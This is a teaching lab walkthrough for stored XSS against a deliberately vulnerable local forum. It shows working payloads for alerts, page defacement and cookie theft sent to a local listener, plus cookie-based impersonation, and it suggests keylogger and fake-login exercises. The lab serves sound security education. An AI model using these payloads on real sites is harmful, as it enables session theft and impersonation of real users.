# Payload Walkthrough: Stored XSS in Open Forum

This is a hands-on lab. You will attack a real, running forum app with stored
cross-site scripting (XSS) payloads, watch what each one does, and see why it
works by reading the exact line of code responsible. Nothing here requires
prior security experience — just comfort with HTML, JavaScript, and your
browser's DevTools.

> ⚠ **Safety notice**
>
> Everything in this lab runs on your own machine (`localhost`) with fake,
> throwaway data. You are not attacking anyone else's computer. Don't copy
> or reuse this code, and never try these techniques on real websites or
> anyone else's systems — only on this app, on your own machine.

---

## 0. Before you start

Follow `README.md` (in this same folder) to install prerequisites, create the
database, and start the forum app. Come back here once:

- The forum is running at `http://localhost:8080/`.
- The attacker listener is running at `http://localhost:9090/`.

Several exercises need **two different "users" open at once** — for example,
you post a comment as `alice`, then switch to `bob` to see it render. The
forum tells users apart with cookies, so two regular tabs in the same browser
will fight over the same cookies. Use one of these instead:

- A normal window for one user, and a **second browser profile** or an
  **InPrivate / Incognito window** for the other, or
- Two different browsers entirely (e.g. Chrome for `alice`, Edge for `bob`).

If the forum ever gets into a confusing state — missing topics, a broken
page, cookies you don't understand — go to **`http://localhost:8080/reset.html`**
and reset the demo. You can do this as many times as you like.

---

## 1. Look at the vulnerable code first

Before you break anything, read what you're about to break. Open
`src/main/resources/static/js/forum.js` and find this function:

```js
function renderComments(comments) {
  ...
  var html = '';
  for (var i = 0; i < comments.length; i++) {
    var c = comments[i];
    html += '<article class="comment"><div class="meta"><span class="author">' + c.userName +
      '</span> · <time class="timestamp" datetime="' + c.commentDateTime + '">' +
      formatDate(c.commentDateTime) + '</time></div><div class="text">' + c.commentText + '</div></article>';
  }
  commentsEl.removeAttribute('aria-busy');
  // THE DELIBERATE VULNERABILITY: no escaping. Students post payloads and watch them run here.
  commentsEl.innerHTML = html;
}
```

Every comment is turned into an HTML string by plain `+` concatenation —
`c.userName` and `c.commentText` are dropped straight into the markup with no
escaping of any kind. That string is then handed to `commentsEl.innerHTML`,
which tells the browser: "parse this text as real HTML and build the page
from it."

There's a second spot doing the same thing, earlier in the same file:

```js
// VULNERABLE ON PURPOSE: the cookie value goes into the page as raw HTML.
whoami.innerHTML = 'Logged in as <strong>' + userName + '</strong>';
```

**Before you continue:** if `c.commentText` or `userName` contained HTML tags
instead of plain words, what do you think the browser would do with them?
Write down a guess. You'll find out in the next two exercises.

---

## 2. The classic payload — and why it does nothing

**Goal:** Post the textbook XSS payload and see it get stored but *not* run.

**Steps:**
1. Log in as `alice` (or any name).
2. In the comment box, paste the payload below and click **Post**.

```html
<script>alert(1)</script>
```

**What you should see:** The page reloads. No alert box appears. If you open
DevTools → Elements and look inside `#comments`, you'll see the literal text
`<script>alert(1)</script>` sitting in a `<div class="text">` — it was stored
in the database and reinserted into the page, but it just sits there as dead
markup.

**Why it works (or rather, doesn't):** Per the HTML specification, when a
`<script>` tag is inserted into the page via `innerHTML` (as `forum.js` does
on the line marked `THE DELIBERATE VULNERABILITY`), the browser parses it
into the DOM but deliberately refuses to execute it. This rule exists for
unrelated historical reasons — it is not a security feature, and it is not
something a developer did on purpose to protect this page.

**This is not a defence.** The comment text was still stored completely
unescaped, and the server-side code has no idea whether what it stored was a
harmless sentence or an attack. The next exercise proves it.

---

## 3. Payloads that DO run

**Goal:** Get real JavaScript to execute using a tag that *isn't* `<script>`.

**Steps:**
1. Still logged in as `alice`, post this comment:

```html
<img src=x onerror=alert(1)>
```

**What you should see:** An alert box pops up immediately after the page
reloads, saying `1`.

2. Reload the page (F5). The alert fires again. Stored XSS means the payload
   lives in the database, not just in your browser's memory — every time
   anyone loads this comment, it runs again.
3. Now switch to `bob` (use your second browser profile/window, log in as
   `bob`, and open the same topic). The alert fires for Bob too, even though
   he never typed the payload. This is the core danger of *stored* XSS: one
   person's post attacks every future visitor.

Try a second tag to confirm it's not an `<img>` quirk:

```html
<svg onload=alert(1)>
```

Same result: an `<svg>` with an `onload` handler fires as soon as it's
inserted into the page.

**Why it works:** `<img>` and `<svg>` are normal, allowed HTML elements —
nothing stops `innerHTML` from creating them. For the `<img>` case, the
browser tries to load the image from the address `x`, that fails, and the
`onerror` attribute — which is just inline JavaScript — fires. `<svg onload>`
fires as soon as the element is inserted, with no failed request needed.
Unlike `<script>`, event-handler attributes on ordinary elements *do* run
when inserted via `innerHTML`, and because the payload is saved as the
comment's text in the database, every page load that renders it re-runs the
same script for whoever is looking.

---

## 4. Username payload

**Goal:** Put a payload in your *username* instead of a comment, and see it
fire in more than one place.

**Steps:**
1. Go to `index.html` and switch users (or use "Switch user" from the
   forum header).
2. Log in with this as the name:

```html
<img src=x onerror=alert('name')>
```

**What you should see:** As soon as the forum page loads, an alert pops up
saying `name`. Open DevTools and look at the `#whoami` element in the header
— the image tag is sitting right there.
3. Post a comment with this user. Reload the page — the same alert now also
   fires once per comment this user has posted, because their name is
   rendered again next to every comment (the `.author` span inside
   `.comment .meta`).

**Getting out of repeated alerts:** once a username payload is in place, an
alert can fire on every page load, which gets annoying fast. Dismiss the
alert box(es), then either click **Switch user** to log in as someone else,
or go to `http://localhost:8080/reset.html` to clear everything and start
clean.

**Why it works:** This hits the other vulnerable line from Section 1:

```js
whoami.innerHTML = 'Logged in as <strong>' + userName + '</strong>';
```

`userName` comes straight from a cookie (`forum_user_name`), which the user
fully controls — the app never checks or escapes it before handing it to
`innerHTML`. The comment list has the exact same problem with `c.userName`.
Anywhere the app prints a username with `innerHTML`, that username's payload
runs again.

---

## 5. Defacement — taking over the page

**Goal:** Use `innerHTML` injection to rewrite parts of the page a normal
comment shouldn't be able to touch.

Each payload below is a **comment**, not a username. Post each one
separately as `alice`, reload, and watch what happens. Element and class
names come straight from `forum.html` / `style.css`.

Change the page's main heading:

```html
<img src=x onerror="document.querySelector('h1').textContent='You got pwned'">
```

Hide every comment on the page:

```html
<img src=x onerror="document.querySelectorAll('.comment').forEach(c=>c.style.display='none')">
```

Restyle the whole page:

```html
<img src=x onerror="document.body.style.filter='invert(1)'">
```

Replace the entire page body with your own HTML:

```html
<img src=x onerror="document.body.innerHTML='<h1>This page has been modified</h1>'">
```

**What you should see:** Each payload changes something a normal forum post
should never be able to touch — the page title, which comments are visible,
the page's colors, or the entire layout.

**Why it works:** `onerror` runs arbitrary JavaScript in the context of the
real forum page. That script has the exact same access to `document` that
the forum's own `forum.js` has — there is no sandbox separating "a user's
comment" from "the page itself." Once a script executes, it owns the page.

**Recovering:** Go to `http://localhost:8080/reset.html` and reset the demo.
This restores the database (and therefore the comments and topics) to its
seeded starting state.

---

## 6. Cookie theft

**Goal:** Steal another user's session cookies and send them to a server you
control, without that user noticing anything.

**Steps:**
1. Log in as `alice` and post this comment:

```html
<img src=x onerror="new Image().src='http://localhost:9090/steal?c='+encodeURIComponent(document.cookie)">
```

2. Switch to your second browser profile/window and log in as `bob`.
3. Open the same topic as `bob` (just loading the page is enough — `bob`
   doesn't need to do anything else).
4. Open `http://localhost:9090/` in any browser tab.

**What you should see:** A new row in the capture table, with a **Data**
value that looks like exactly this:

```text
c=forum_user_id=2; forum_user_name=bob
```

The `c=` at the front is just the name of the query parameter the payload
used to send the data — it isn't part of the cookie string. When you copy
values out of this in Section 7, ignore the `c=` and start from
`forum_user_id=...`.

**Why it works:** Creating `new Image()` and setting its `.src` makes the
browser fire a plain `GET` request to that URL — no popup, no visible
network activity to the victim, nothing that looks different from loading a
broken picture. `document.cookie` returns every cookie the forum can read
(the forum never marks its cookies `HttpOnly`, which would have blocked
this). Wrapping it in `encodeURIComponent` keeps special characters like `;`
and `=` from breaking the query string.

---

## 7. Impersonation

**Goal:** Use the stolen cookie values to become `bob`, without knowing his
password (the forum doesn't even have one).

**Steps:**
1. From Section 6, you should have `bob`'s cookie values:
   `forum_user_id` and `forum_user_name` (remember to ignore the `c=`
   prefix — the actual cookie string starts right after it).
2. Open a **different** browser window than the one you used as `bob` (your
   `alice` window works fine, or any fresh one).
3. Open DevTools → **Application** tab → **Cookies** → pick
   `http://localhost:8080`.
4. Find `forum_user_id` and `forum_user_name` in the list and edit their
   values to match what you captured for `bob`.
5. Reload the forum page.

**What you should see:** The header now reads "Logged in as bob." Post a new
comment — it's saved and displayed as if `bob` wrote it.

**Why it works:** The server never reads cookies at all —
`CommentController` has no idea cookies exist. What actually happens is
entirely in the browser: `forum.js` reads the `forum_user_id` cookie with
`getCookie(...)` and sends it as `userId` in the JSON body of the `POST` to
`/api/topics/{topicId}/comments`; the controller passes that `userId`
straight through with no check that it belongs to whoever is actually
sitting at the browser. The "Logged in as bob" text you see in the header
comes from a completely separate source — the `forum_user_name` cookie, read
and dropped into `#whoami` with `innerHTML` (Section 1). Nothing ties these
two cookies together or checks either one against the server: whichever
`forum_user_id` happens to be sitting in your browser's cookies at the
moment you click **Post** is whose name goes on the comment.

### 7b. Impersonation without theft

**Steps:**
1. Stay logged in from step 5 above. Look closely at the `forum_user_id`
   value you just pasted in. It's just a small integer: `2`, in the example
   above.
2. In DevTools, change `forum_user_id` to a *different* small number you
   never stole from anyone. After a reset, the seeded users are `1` (alice),
   `2` (bob), `3` (carol) and `4` (dave), so try `1`, `3` or `4`.
3. Reload the page and post a comment.

**What you should see:** The comment is saved and, once you look at the
comment list, shows up credited to whichever real user actually owns that
id — not necessarily the name shown in your own header, because the author
name next to a comment comes from the server's own record (`c.userName`),
not from your cookies. You just posted as an arbitrary user by guessing a
small integer, without stealing anything at all.

**Why it works:** `forum_user_id` is never validated against anything — it's
just a number sitting in a cookie that happens to match a row in the `users`
table. The browser's own JavaScript reads whatever value is in that cookie
and sends it as `userId` in the POST body, and the server accepts it with no
authentication check whatsoever. You don't need a stolen value — any small
integer that belongs to a real user works just as well.

---

## 8. Free play: make the page do anything

You've seen alerts, defacement, cookie theft, and impersonation. Now combine
ideas. All of these stay inside `localhost` — nothing leaves your machine.
A few starting points, roughly in order of difficulty:

- **Keylogger:** attach a `keydown` listener to the comment `<textarea>`
  (`#commentText`) that sends each key to `/steal` with `fetch` as a `POST`.
- **Fake login overlay:** cover the page with a "Session expired, please log
  in again" form, and `POST` whatever the victim types into it to `/steal`.
- **Auto-post as the viewer:** fire a `fetch POST` to
  `/api/topics/{topicId}/comments` as soon as the payload loads, so the
  *victim's* account posts a comment they never wrote. (Look at the request
  body shape in `forum.js`'s `setupCompose` function for the exact JSON
  fields it expects.)
- **Redirect:** send every visitor somewhere else with
  `location.href = '...'`.

If you get the forum into a state you can't make sense of, reset it at
`http://localhost:8080/reset.html` and keep going.

---

## 9. Spot the fix

Open `http://localhost:9090/` — the attacker's own capture page. Notice that
when it shows you the raw data from a payload (including HTML tags you
posted), it displays them as plain text, not as running HTML. Look at the
`escape` method in `attacker/AttackerServer.java` — that's the function
responsible for making sure captured data shows up as text instead of
running as markup.

Even the attacker's own code treats user-controlled data as text, not
markup, before putting it on a page.

**Question to think about:** what is the one change you'd make in
`forum.js` — to the lines marked `THE DELIBERATE VULNERABILITY` and
`VULNERABLE ON PURPOSE` — that would stop every exercise in this
walkthrough at once? (Hint: it's about *how* text gets inserted into the
page, not about blocking specific words like `script` or `onerror`.)

Beyond that one fix, production applications layer on more defences you'll
hear about elsewhere in the course — a Content-Security-Policy header that
restricts what scripts are allowed to run, `HttpOnly` cookies so JavaScript
can't read session cookies at all, and server-side validation of what a
"name" or "comment" is allowed to contain. None of those are implemented
here on purpose, and figuring out the first fix yourself is more valuable
than reading one in this file.

---

## 10. Reflection questions

Think through these on your own or discuss them with a partner. There are no
answers provided here.

1. Suppose this forum added a "Direct Message" feature between users,
   rendered with `innerHTML` the same way as comments, but the code trims
   and HTML-escapes the message body before saving it to the database. A
   teammate says DMs are now safe from XSS. What's one test message you'd
   try against this new feature before agreeing with them, and what exactly
   would you be checking for?
2. You're reviewing a teammate's code and see this line, where
   `displayName` comes from a signup form:
   `document.getElementById('welcome').innerHTML = 'Hi, ' + user.displayName;`
   List the specific questions you'd ask the author before approving it.
3. Suppose the team adds a Content-Security-Policy header that blocks
   inline event-handler attributes (so `onerror="..."` and `onload="..."`
   stop working), but still allows `<script src="...">` from a short list
   of trusted domains. Which of this walkthrough's exercises would that CSP
   stop, and which — if any — could still work around it?
4. Suppose the forum's cookies were changed to be `HttpOnly`. Walk back
   through Sections 6 and 7 in your head: which specific step would now
   fail, and which steps would still work exactly as before? Why?
5. A different app lets users upload a profile picture and stores the
   uploaded filename, later displaying it next to their posts using the
   same unescaped-concatenation pattern this forum uses for `c.userName`.
   Is this a stored or a reflected XSS risk, and why? What would you try as
   a "filename" to test it?
6. Imagine the server started checking that the `userId` sent with a new
   comment must exist in the `users` table before accepting the post — but
   it didn't check that the id belongs to whoever is actually making the
   request. Would that stop the technique from the end of Section 7? Why or
   why not?

---

## Troubleshooting

**My payload didn't fire.**
- Did you actually reload the page after posting? Some payloads (like the
  `#whoami` ones) run on page load, not the instant you post.
- Did you paste a plain `<script>` tag expecting an alert? Re-read Section 2
  — that one is *supposed* to do nothing.
- Check your quotes. If your payload has both single and double quotes
  nested incorrectly (for example, inside an `onerror="..."` attribute),
  the browser will fail to parse the attribute and nothing will run. Copy
  the payloads from this file exactly.

**My capture never showed up on `:9090`.**
- If you used a `GET`-based payload (an `<img>` pixel, like in Section 6),
  make sure the data is wrapped in `encodeURIComponent(...)`. A raw `%`
  character in the query string will make the listener reject the request
  before it's even captured, and an unencoded `&` or `#` can cut the
  captured data short.
- Switching to a `fetch(...).then(...)` call with `method: 'POST'` avoids
  the encoding issue entirely, since the data travels in the request body
  instead of the URL.

**The forum is unusable / stuck in a broken state.**
- Go to `http://localhost:8080/reset.html` and reset the demo. This is safe
  to do as often as you like and restores the seeded topics and comments.
